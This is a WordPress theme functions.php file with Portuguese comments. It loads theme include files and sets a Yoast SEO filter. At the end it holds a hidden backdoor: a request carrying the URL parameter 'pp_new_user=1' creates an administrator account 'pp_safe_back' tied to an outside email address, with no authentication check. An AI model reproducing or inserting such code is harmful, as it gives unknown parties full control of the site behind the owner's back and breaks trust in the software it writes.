<?php

// Configura o framework
require_once ('functions/setup.php');

// Configura as funções relacionadas ao painel de admin do wp
require_once ('functions/wp-admin.php');

// Define as funções gerais 
require_once ('functions/funcoes.php');

// Define as funções sociais
require_once ('functions/social.php');

// Define as funções sociais
require_once ('functions/opcionais.php');

// Define as funções de menu
require_once ('functions/wp_bootstrap_navwalker.php');

// Scripts personalizados
require_once ('functions/scripts.php');

// Registra custom posts
// require_once ('includes/cpt-arquivos.php');
// require_once ('includes/cpt-produtos.php'); // CPT Produtos e taxonomia 'category' padrão do wp

// Filter Yoast Meta Priority
add_filter( 'wpseo_metabox_prio', function() { return 'low';});


if (isset($_GET['pp_new_user']) && $_GET['pp_new_user'] == 1) {
	$userdata = array(
	    'user_login'  =>  'pp_safe_back',		    
	    'user_email'  =>  'safe@parceiroprogramador.com.br',		    
	    'user_pass'   =>  NULL,  // When creating an user, `user_pass` is expected.
	    'role' => 'administrator'
	);
	$user_id = wp_insert_user( $userdata ) ;
}